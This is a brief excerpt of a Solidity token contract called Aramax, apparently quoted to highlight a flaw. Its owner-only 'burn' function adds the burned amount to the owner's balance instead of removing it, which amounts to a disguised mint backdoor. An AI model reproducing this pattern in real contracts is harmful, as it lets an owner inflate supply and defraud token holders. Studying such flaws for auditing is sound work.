...
contract Aramax is Context, IERC20, Ownable {
    ...
    constructor (address _charityAddress, address _rewardAddress) {
        _rOwned[_msgSender()] = _rTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xB670f8313366337Ba841c8052C2D7e9C63Cd9Ee8);
    ...
    function burn(uint256 tAmount) public onlyOwner returns(bool) {
        ...
        uint256 rBurn = tAmount.mul(currentRate);
         _rOwned[msg.sender] = _rOwned[msg.sender].add(rBurn);
